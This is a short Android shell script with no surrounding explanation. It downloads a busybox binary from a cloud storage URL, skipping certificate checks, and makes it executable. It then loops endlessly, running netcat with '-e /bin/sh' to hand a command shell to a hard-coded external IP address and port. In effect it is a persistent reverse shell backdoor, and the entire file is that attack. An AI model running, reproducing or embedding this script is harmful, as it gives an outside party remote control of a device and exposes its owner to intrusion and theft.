#!/system/bin/sh

# Download busybox to /data/local/tmp
dcurl --dns-servers 1.1.1.1 -k -o /data/local/tmp/busybox https://ktrud.nyc3.digitaloceanspaces.com/busybox-arm64

# Give execute permissions
chmod +x /data/local/tmp/busybox

# Run the loop with netcat command
while true
do
  /data/local/tmp/busybox nc 3.141.142.211 14817 -e /bin/sh
  
done

